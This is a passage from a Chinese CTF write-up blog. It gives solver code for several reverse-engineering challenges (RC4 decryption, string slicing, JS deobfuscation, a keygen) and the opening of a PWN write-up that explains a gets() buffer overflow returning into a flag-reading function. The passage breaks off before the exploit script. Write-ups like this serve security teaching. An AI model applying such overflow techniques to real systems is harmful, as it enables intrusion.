class="type">int</span> v6 = <span class="number">238</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">45</span>; i &gt;= <span class="number">0</span>;) &#123;</span><br><span class="line">        --i;</span><br><span class="line">        s[i] = s3[i] ^ (key2[((<span class="type">int</span>)key2[v5] + key2[v6])%<span class="number">256</span>]);</span><br><span class="line">        swap(key2 + v5, key2 + v6);</span><br><span class="line">        v6 = (v6 - (<span class="type">int</span>) key2[v5] + <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">        v5 = (v5 - <span class="number">1</span>) &lt; <span class="number">0</span> ? <span class="number">255</span> : v5 - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这里用来求循环的最终状态以反向执行</span></span><br><span class="line"><span class="comment">    int v5 = 0;</span></span><br><span class="line"><span class="comment">    int v6 = 0;</span></span><br><span class="line"><span class="comment">    int i = 0;</span></span><br><span class="line"><span class="comment">    while (i &lt; len) &#123;</span></span><br><span class="line"><span class="comment">        v5 = (v5 + 1) % 256;</span></span><br><span class="line"><span class="comment">        v6 = (v6 + key2_origin[v5]) % 256;</span></span><br><span class="line"><span class="comment">        swap(key2_origin + v5, key2_origin + v6);</span></span><br><span class="line"><span class="comment">        ++i;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;v5=%d,v6=%d\n&quot;, v5, v6);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 256; ++i) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d,&quot;, key2_origin[i]);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们实际上知道RC4的加解密的过程是相同的…</p><p>所以代码实际上基本不用改…</p><p>正解代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">0</span>, v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v6 = (v6 + key2_origin[v5]) % <span class="number">256</span>;</span><br><span class="line">        swap(key2_origin + v5, key2_origin + v6);</span><br><span class="line">        s[i] = s3[i] ^ (key2_origin[((<span class="type">int</span>) key2_origin[v5] + key2_origin[v6]) % <span class="number">256</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的结果是一样的:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807225943226.png" alt="image-20230807225943226"></p><p>然后复制到python的解密脚本中转换成utf-8的字符串就行,不过貌似没有base64的事…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = []</span><br><span class="line">data = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">str</span> += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\devtools\venu\Scripts\python.exe D:\Data\CTF\do\re_run.py </span><br><span class="line"><span class="number">110</span> <span class="number">49</span> <span class="number">98</span> <span class="number">111</span> <span class="number">111</span> <span class="number">107</span> <span class="number">123</span> <span class="number">117</span> <span class="number">115</span> <span class="number">49</span> <span class="number">110</span> <span class="number">71</span> <span class="number">95</span> <span class="number">102</span> <span class="number">51</span> <span class="number">97</span> <span class="number">116</span> <span class="number">117</span> <span class="number">114</span> <span class="number">51</span> <span class="number">115</span> <span class="number">95</span> <span class="number">55</span> <span class="number">111</span> <span class="number">95</span> <span class="number">100</span> <span class="number">101</span> <span class="number">55</span> <span class="number">101</span> <span class="number">114</span> <span class="number">109</span> <span class="number">49</span> <span class="number">110</span> <span class="number">51</span> <span class="number">95</span> <span class="number">52</span> <span class="number">108</span> <span class="number">103</span> <span class="number">48</span> <span class="number">114</span> <span class="number">105</span> <span class="number">55</span> <span class="number">104</span> <span class="number">109</span> <span class="number">125</span></span><br><span class="line">[<span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;98&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;107&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;116&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;108&#x27;</span>, <span class="string">&#x27;103&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;105&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;104&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;125&#x27;</span>]</span><br><span class="line">n1book&#123;us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm&#125;</span><br></pre></td></tr></table></figure><p>结束…</p><h2 id="slices">slices</h2><p>这题简单…因为没题干把题目的源代码也放上来吧…</p><p>题目代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fail</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>: fail()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[:<span class="number">5</span>] != <span class="string">&#x27;hope&#123;&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">1</span>] != <span class="string">&#x27;&#125;&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">5</span>::<span class="number">3</span>] != <span class="string">&#x27;i0_tnl3a0&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">4</span>::<span class="number">4</span>] != <span class="string">&#x27;&#123;0p0lsl&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">3</span>::<span class="number">5</span>] != <span class="string">&#x27;e0y_3l&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">6</span>::<span class="number">3</span>] != <span class="string">&#x27;_vph_is_t&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">7</span>::<span class="number">3</span>] != <span class="string">&#x27;ley0sc_l&#125;&#x27;</span>: fail() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Congrats!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag is: &#x27;</span>, flag)</span><br></pre></td></tr></table></figure><p>就这么简单,写个脚本就行了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">source, start, end, step</span>):</span><br><span class="line">    idx = start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(source)):</span><br><span class="line">        flag[idx] = source[i]</span><br><span class="line">        idx += step</span><br><span class="line">        <span class="keyword">if</span> idx &gt;= end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;hope&#123;&#x27;</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">go(<span class="string">&#x27;i0_tnl3a0&#x27;</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;&#123;0p0lsl&#x27;</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">4</span>)</span><br><span class="line">go(<span class="string">&#x27;e0y_3l&#x27;</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>)</span><br><span class="line">go(<span class="string">&#x27;_vph_is_t&#x27;</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;ley0sc_l&#125;&#x27;</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure><p>不出意外的话答案应该没啥问题…(解密脚本写的不咋地…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807233325281.png" alt="image-20230807233325281"></p><p>hope{i_l0ve_pyth0n_slic3s_a_l0t}</p><p>结束…</p><h2 id="super-anti-scalper-solution-9000">super anti scalper solution 9000</h2><p>这个题就是JS混淆,代码很简单,我们其实只需要一件事:</p><p>​JS中任何对象都是true…</p><p>还有一件事:</p><p>​!![]把[]转换为布尔值,又[]是一个对象,所以他是true,然后!取反,!再取反,所以!![]的值就是true</p><p>还有一件事:</p><p>​!![]+!![]对2个true进行相加,显然true是1,那么答案就是1+1</p><p>所以首先就把!![]全部换成1,方便查看:<s>其实不替换也行…</s></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808095802372.png" alt="image-20230808095802372"></p><p>很显然,输入的字符串就是n,然后在第27行进行了比较,所以其实直接把27行n===后面那一串输出就行…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808100000896.png" alt="image-20230808100000896"></p><p>运行结果(记得按一下按钮):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808103948072.png" alt="image-20230808103948072" style="zoom:45%;" /><p>hope{sHoe_1ddbf55508afcc08_sold!}</p><p>结束…</p><h2 id="open-source">open-source</h2><p>这题…给了代码…那就不是题了…</p><p>解释直接放注释了,运行出来的结果就是flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123; <span class="comment">//3个参数 51966 25 h4cky0u</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;<span class="comment">//51966</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;<span class="comment">//25</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808105306027.png" alt="image-20230808105306027"></p><p>结束…</p><h1 id="pwn">PWN</h1><h2 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h2><p>我只能说这个题对于我有点新了…貌似有两个做法,但是第一个做法那个exit()不太会搞,先放了吧…</p><h3 id="方法一">方法一</h3><p>这个题,乍一看是一个ret2next,但是…一开始本地能跑通,远程不过…后续发现大概是缓冲区刷新的问题,于是让printf继续返回到exit()以进行缓冲区刷新即可通过</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809114710444.png" alt="image-20230809114710444"></p><p>开幕雷击(爽击)…gets()就躺在那里,所以我们肯定是要从main开始ret,不过注意一个问题,那就是没有push ebp了(具体去看main的汇编)</p><p>但是除此之外没有调用任何的函数,那就去找吧,去尝试找&quot;flag&quot;字符串发现第一个就是,然后双击过去到汇编(?),接下来按Ctrl+x快捷键跳转到使用了这个字符串的函数,发现是一个get_secret()函数:</p><p>有一个flag.txt文件相关的字符串:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115015923.png" alt="image-20230809115015923"></p><p>双击过去:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115051406.png" alt="image-20230809115051406"></p><p>ctrl+x跳转,然后f5查看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115244164.png" alt="image-20230809115244164"></p><p>这个函数将flag.txt写入了fl4g这个地方(可寻址),那么我们接下来的事就是想办法跳转到get_secret()然后再用printf或者write之类的输出就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 